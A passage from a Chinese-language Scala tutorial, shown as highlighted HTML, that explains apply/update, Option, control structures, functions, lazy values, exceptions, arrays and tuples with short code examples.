class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) 等同于 <span class="type">Array</span>.apply(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">如：</span><br><span class="line">println(<span class="string">"Hello"</span>(<span class="number">4</span>))</span><br><span class="line">println(<span class="string">"Hello"</span>.apply(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>在<code>StringOps</code>中你会发现一个 <code>def apply(n: Int): Char</code>方法定义。<code>update</code>方法也是调用时可以省略方法名的方法，用于元素的更新：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arr(<span class="number">4</span>) = <span class="number">5</span>  等同于  arr.update(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">如：</span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">5</span>)</span><br><span class="line">arr1(<span class="number">1</span>) = <span class="number">2</span></span><br><span class="line">arr1.update(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">println(arr1.mkString(<span class="string">","</span>))</span><br></pre></td></tr></table></figure><h4 id="Option类型"><a href="#Option类型" class="headerlink" title="Option类型"></a>Option类型</h4><p>Scala为单个值提供了对象的包装器，表示为那种可能存在也可能不存在的值。他只有两个有效的子类对象，一个是Some，表示某个值，另外一个是None，表示为空，通过Option的使用，避免了使用null、空字符串等方式来表示缺少某个值的做法。</p><p>如：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> map1 = <span class="type">Map</span>(<span class="string">"Alice"</span> -&gt; <span class="number">20</span>, <span class="string">"Bob"</span> -&gt; <span class="number">30</span>)</span><br><span class="line">println(map1.get(<span class="string">"Alice"</span>))</span><br><span class="line">println(map1.get(<span class="string">"Jone"</span>))</span><br></pre></td></tr></table></figure><h3 id="控制结构和函数"><a href="#控制结构和函数" class="headerlink" title="控制结构和函数"></a>控制结构和函数</h3><h4 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h4><p>Scala中没有三目运算符，因为根本不需要。Scala中if else表达式是有返回值的，如果if或者else返回的类型不一样，就返回Any类型（所有类型的公共超类型）。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a3 = <span class="number">10</span></span><br><span class="line">    <span class="keyword">val</span> a4 =</span><br><span class="line">      <span class="comment">//返回类型一样</span></span><br><span class="line">      <span class="keyword">if</span>(a3 &gt; <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="string">"a3大于20"</span></span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="string">"a3小于20"</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">val</span> a5 = </span><br><span class="line">      <span class="keyword">if</span>(a3 &gt; <span class="number">20</span>)&#123;</span><br><span class="line">          <span class="string">"a3大于20"</span></span><br><span class="line">      &#125;</span><br><span class="line">    println(a4)</span><br><span class="line">    <span class="comment">//a3小于20</span></span><br><span class="line">    println(a5)</span><br><span class="line">    <span class="comment">//()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果缺少一个判断，什么都没有返回，但是Scala认为任何表达式都会有值，对于空值，使用Unit类，写做()，叫做无用占位符，相当于Java中的void。</p><p>Tips: 行尾的位置不需要分号，只要能够从上下文判断出语句的终止即可。但是如果在单行中写多个语句，则需要分号分割。在Scala中，{}块包含一系列表达式，其结果也是一个表达式。块中最后一个表达式的值就是块的值。</p><h4 id="while-表达式"><a href="#while-表达式" class="headerlink" title="while 表达式"></a>while 表达式</h4><p>Scala提供和Java一样的while和do循环，与If语句不同，While语句本身没有值，即整个While语句的结果是Unit类型的()。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">val</span> while1 = <span class="keyword">while</span>(n &lt;= <span class="number">10</span>)&#123;</span><br><span class="line">      n += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println(while1) <span class="comment">//()</span></span><br><span class="line">    println(n) <span class="comment">//11</span></span><br><span class="line">    <span class="comment">//Scala提供和Java一样的while和do循环，与If语句不同，While语句本身没有值，即整个While语句的结果是Unit类型的()。</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>while循环的中断</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.util.control.<span class="type">Breaks</span></span><br><span class="line"><span class="keyword">val</span> loop = <span class="keyword">new</span> <span class="type">Breaks</span></span><br><span class="line">loop.breakable&#123;</span><br><span class="line">  <span class="keyword">while</span>(n &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">    n += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">18</span>)&#123;</span><br><span class="line">      loop.<span class="keyword">break</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">println(n)</span><br></pre></td></tr></table></figure><p>Tips: Scala并没有提供break和continue语句来退出循环，如果需要break，可以通过几种方法来做1、使用Boolean型的控制变量 2、使用嵌套函数，从函数中return 3、使用Breaks对象的break方法。</p><h4 id="for表达式"><a href="#for表达式" class="headerlink" title="for表达式"></a>for表达式</h4><p>Scala也为for循环这一常见的控制结构提供了非常多的特性，这些for循环特性被称为for推导式(for comprehension)或for表达式(for expression).</p><h5 id="for示例1-to左右两边为前闭后闭的访问"><a href="#for示例1-to左右两边为前闭后闭的访问" class="headerlink" title="for示例1: to左右两边为前闭后闭的访问"></a>for示例1: to左右两边为前闭后闭的访问</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span>; j &lt;- <span class="number">1</span> to <span class="number">3</span>)&#123;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例2：until左右两边为前闭后开的访问"><a href="#for示例2：until左右两边为前闭后开的访问" class="headerlink" title="for示例2：until左右两边为前闭后开的访问"></a>for示例2：until左右两边为前闭后开的访问</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> until <span class="number">3</span>; j &lt;- <span class="number">1</span> until <span class="number">3</span>) &#123;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例3：引入保护式（也称条件判断式）该语句只打印1-3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue"><a href="#for示例3：引入保护式（也称条件判断式）该语句只打印1-3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue" class="headerlink" title="for示例3：引入保护式（也称条件判断式）该语句只打印1 3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue"></a>for示例3：引入保护式（也称条件判断式）该语句只打印1 3。保护式满足为true则进入循环内部，满足为false则跳过，类似于continue</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span> <span class="keyword">if</span> i != <span class="number">2</span>) &#123;</span><br><span class="line">  print(i + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例4：引入变量"><a href="#for示例4：引入变量" class="headerlink" title="for示例4：引入变量"></a>for示例4：引入变量</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">3</span>; j = <span class="number">4</span> - i) &#123;</span><br><span class="line">  print(j + <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><h5 id="for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字"><a href="#for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字" class="headerlink" title="for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字"></a>for示例5：将遍历过程中处理的结果返回到一个，使用yield关键字</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> for5 = <span class="keyword">for</span>(i &lt;- <span class="number">1</span> to <span class="number">10</span>) <span class="keyword">yield</span> i</span><br><span class="line">println(for5)</span><br></pre></td></tr></table></figure><h5 id="for示例6：使用花括号-代替小括号"><a href="#for示例6：使用花括号-代替小括号" class="headerlink" title="for示例6：使用花括号{}代替小括号()"></a>for示例6：使用花括号{}代替小括号()</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>&#123;</span><br><span class="line">  i &lt;- <span class="number">1</span> to <span class="number">3</span></span><br><span class="line">  j = <span class="number">4</span> - i&#125;</span><br><span class="line">  print(i * j + <span class="string">" "</span>)</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><p><strong>Tips</strong>: {}和()对于for表达式来说都可以。for 推导式有一个不成文的约定：当for<br>推导式仅包含单一表达式时使用原括号，当其包含多个表达式时使用大括号。值得注意的是，使用原括号时，早前版本的Scala 要求表达式之间必须使用分号。</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>scala定义函数的标准格式为：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">函数名</span></span>(参数名<span class="number">1</span>: 参数类型<span class="number">1</span>, 参数名<span class="number">2</span>: 参数类型<span class="number">2</span>) : 返回类型 = &#123;函数体&#125;</span><br></pre></td></tr></table></figure><p>函数示例1：返回Unit类型的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">shout1</span><span class="params">(content: String)</span> : Unit </span>= &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例2：返回Unit类型的函数，但是没有显式指定返回类型。（当然也可以返回非Unit类型的值）</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout2</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例3:返回值类型有多种可能，此时也可以省略Unit</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout3</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  <span class="keyword">if</span>(content.length &gt;= <span class="number">3</span>)</span><br><span class="line">    content + <span class="string">"喵喵喵~"</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例4：带有默认值参数的函数，调用该函数时，可以只给无默认值的参数传递值，也可以都传递，新值会覆盖默认值；传递参数时如果不按照定义顺序，则可以通过参数名来指定。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout4</span></span>(content: <span class="type">String</span>, leg: <span class="type">Int</span> = <span class="number">4</span>) = &#123;</span><br><span class="line">  println(content + <span class="string">","</span> + leg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数示例5：变长参数（不确定个数参数，类似Java的…）</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span></span>(args: <span class="type">Int</span>*) = &#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span>(arg &lt;- args)</span><br><span class="line">    result += arg</span><br><span class="line">  result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>递归函数：递归函数在使用时必须有明确的返回值类型</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span></span>(n: <span class="type">Int</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">  <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    n * factorial(n - <span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips:</strong></p><p>1、Scala可以通过=右边的表达式  推断出函数的返回类型。如果函数体需要多个表达式，可以用代码块{}。</p><p>2、可以把return 当做  函数版本的break语句。</p><p>3、递归函数一定要指定返回类型。</p><p>4、变长参数通过* 来指定，所有参数会转化为一个seq序列。</p><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>我们将函数的返回类型为Unit的函数称之为过程。</p><h5 id="定义过程示例1："><a href="#定义过程示例1：" class="headerlink" title="定义过程示例1："></a>定义过程示例1：</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) : <span class="type">Unit</span> = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义过程示例2：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) = &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义过程示例3：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shout1</span></span>(content: <span class="type">String</span>) &#123;</span><br><span class="line">  println(content)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尖叫提示：这只是一个逻辑上的细分，如果因为该概念导致了理解上的混淆，可以暂时直接跳过过程这样的描述。毕竟过程，在某种意义上也是函数。</p><h4 id="懒值"><a href="#懒值" class="headerlink" title="懒值"></a>懒值</h4><p>当val被声明为lazy时，他的初始化将被推迟，直到我们首次对此取值，适用于初始化开销较大的场景。</p><p>lazy示例：通过lazy关键字的使用与否，来观察执行过程</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Lazy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">init</span></span>(): <span class="type">String</span> = &#123;</span><br><span class="line">    println(<span class="string">"init方法执行"</span>)</span><br><span class="line">    <span class="string">"嘿嘿嘿，我来了~"</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">lazy</span> <span class="keyword">val</span> msg = init()</span><br><span class="line">    println(<span class="string">"lazy方法没有执行"</span>)</span><br><span class="line">    println(msg)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>当碰到异常情况时，方法抛出一个异常，终止方法本身的执行，异常传递到其调用者，调用者可以处理该异常，也可以升级到它的调用者。运行系统会一直这样升级异常，直到有调用者能处理它。 如果一直没有处理，则终止整个程序。</p><p>Scala的异常的工作机制和Java一样，但是Scala没有“checked”异常，你不需要声明说函数或者方法可能会抛出某种异常。受检异常在编译器被检查，java必须声明方法所会抛出的异常类型。</p><p><strong>抛出异常</strong>：用throw关键字，抛出一个异常对象。所有异常都是Throwable的子类型。throw表达式是有类型的，就是Nothing，因为Nothing是所有类型的子类型，所以throw表达式可以用在需要类型的地方。</p><p><strong>捕捉异常：</strong>在Scala里，借用了模式匹配的思想来做异常的匹配，因此，在catch的代码里，是一系列case字句。</p><p>异常捕捉的机制与其他语言中一样，如果有异常发生，catch字句是按次序捕捉的。因此，在catch字句中，越具体的异常越要靠前，越普遍的异常越靠后。 如果抛出的异常不在catch字句中，该异常则无法处理，会被升级到调用者处。</p><p>finally字句用于执行不管是正常处理还是有异常发生时都需要执行的步骤，一般用于对象的清理工作。</p><h5 id="异常示例："><a href="#异常示例：" class="headerlink" title="异常示例："></a>异常示例：</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ExceptionSyllabus</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">divider</span></span>(x: <span class="type">Int</span>, y: <span class="type">Int</span>): <span class="type">Float</span>= &#123;</span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">Exception</span>(<span class="string">"0作为了除数"</span>)</span><br><span class="line">    <span class="keyword">else</span> x / y</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          println(divider(<span class="number">10</span>, <span class="number">3</span>))</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">          <span class="keyword">case</span> ex: <span class="type">Exception</span> =&gt; println(<span class="string">"捕获了异常："</span> + ex)</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="数据结构特点"><a href="#数据结构特点" class="headerlink" title="数据结构特点"></a>数据结构特点</h4><p>Scala同时支持可变集合和不可变集合，不可变集合从不可变，可以安全的并发访问。</p><p>两个主要的包：</p><p>不可变集合：scala.collection.immutable</p><p>可变集合：  scala.collection.mutable</p><p>Scala优先采用不可变集合，对于几乎所有的集合类，Scala都同时提供了可变和不可变的版本。</p><p>不可变集合继承层次：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g61hebn4l8j20qa0j63zo.jpg" alt></p><p>可变集合继承层次：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g61hf54tkwj20xc0l0q50.jpg" alt></p><h4 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h4><h5 id="1-定长数组"><a href="#1-定长数组" class="headerlink" title="1.定长数组"></a>1.定长数组</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="keyword">new</span> <span class="type">Array</span>[<span class="type">Int</span>](<span class="number">10</span>)</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arr1(<span class="number">1</span>) = <span class="number">7</span></span><br><span class="line">或：</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr1 = <span class="type">Array</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h5 id="2-变长数组"><a href="#2-变长数组" class="headerlink" title="2.变长数组"></a>2.变长数组</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr2 = <span class="type">ArrayBuffer</span>[<span class="type">Int</span>]()</span><br><span class="line"><span class="comment">//追加值</span></span><br><span class="line">arr2.append(<span class="number">7</span>)</span><br><span class="line"><span class="comment">//重新赋值</span></span><br><span class="line">arr2(<span class="number">0</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><h5 id="3-定长数据与变长数据的装换"><a href="#3-定长数据与变长数据的装换" class="headerlink" title="3.定长数据与变长数据的装换"></a>3.定长数据与变长数据的装换</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arr1.toBuffer</span><br><span class="line">arr2.toArray</span><br></pre></td></tr></table></figure><h5 id="4-多维数据"><a href="#4-多维数据" class="headerlink" title="4.多维数据"></a>4.多维数据</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">val</span> arr3 = <span class="type">Array</span>.ofDim[<span class="type">Double</span>](<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arr3(<span class="number">1</span>)(<span class="number">1</span>) = <span class="number">11.11</span></span><br></pre></td></tr></table></figure><h5 id="5-与Java数组的互转"><a href="#5-与Java数组的互转" class="headerlink" title="5.与Java数组的互转"></a>5.与Java数组的互转</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//scala =&gt; Java</span></span><br><span class="line"><span class="keyword">val</span> arr4 = <span class="type">ArrayBuffer</span>(<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>)</span><br><span class="line"><span class="comment">//Scala to Java</span></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConversions</span>.bufferAsJavaList</span><br><span class="line"><span class="keyword">val</span> javaArr = <span class="keyword">new</span> <span class="type">ProcessBuilder</span>(arr4)</span><br><span class="line">println(javaArr.command())</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java =&gt; scala</span></span><br><span class="line"><span class="keyword">import</span> scala.collection.<span class="type">JavaConversions</span>.asScalaBuffer</span><br><span class="line"><span class="keyword">import</span> scala.collection.mutable.<span class="type">Buffer</span></span><br><span class="line"><span class="keyword">val</span> scalaArr: <span class="type">Buffer</span>[<span class="type">String</span>] = javaArr.command()</span><br><span class="line">println(scalaArr)</span><br></pre></td></tr></table></figure><p>6.数据的遍历</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(x &lt;- arr1) &#123;</span><br><span class="line">  println(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-3-元组-Tuple"><a href="#5-3-元组-Tuple" class="headerlink" title="5.3 元组 Tuple"></a>5.3 元组 Tuple</h4><p>元组可以理解为一个容器，可以存放各种相同或者不同类型的数据。</p><h5 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> tuple1 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">"heiheihei"</span>)</span><br><span class="line">println(tuple1)</span><br></pre></td></tr></table></figure><h5 id="访问-注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0"><a href="#访问-注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0" class="headerlink" title="访问(注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0)"></a>访问(注意元素元素访问邮箱划线，并且访问下标从1开始，而不是0)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">val value1 = tuple1._4</span><br><span class="line">println(value1)</span><br></pre></td></tr></table></figure><h5 id="元组的遍历"><a href="#元组的遍历" class="headerlink" title="元组的遍历"></a>元组的遍历</h5><p><strong>方式1</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (elem &lt;- tuple1.productIterator) &#123;</span><br><span class="line">  print(elem)</span><br><span class="line">&#125;</span><br><span class="line">println()</span><br></pre></td></tr></table></figure><p><strong>方式2</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tuple1.productIterator.foreach(i =&gt; println(i))</span><br><span class="line">tuple1.productIterator.foreach(print(_))</span><br></pre></td></tr></table></figure><h4 id="列表List"><a href="#列表List" class="headerlink" title="列表List"></a>列表List</h4><p>如果List列表为空，则使用Nil来表示</p><h5 id="创建List"><a href="#创建List" class="headerlink" title="创建List"></a>创建List</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> list1 = <span class="type">List</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">println(list1)</span><br></pre></td></tr></table></figure><h5 id="访问List元素"><a href="#访问List元素" class="headerlink" title="访问List元素"></a>访问List元素</h5><figure class="highlight scala"><table><tr><td class="gutter"><pre><span 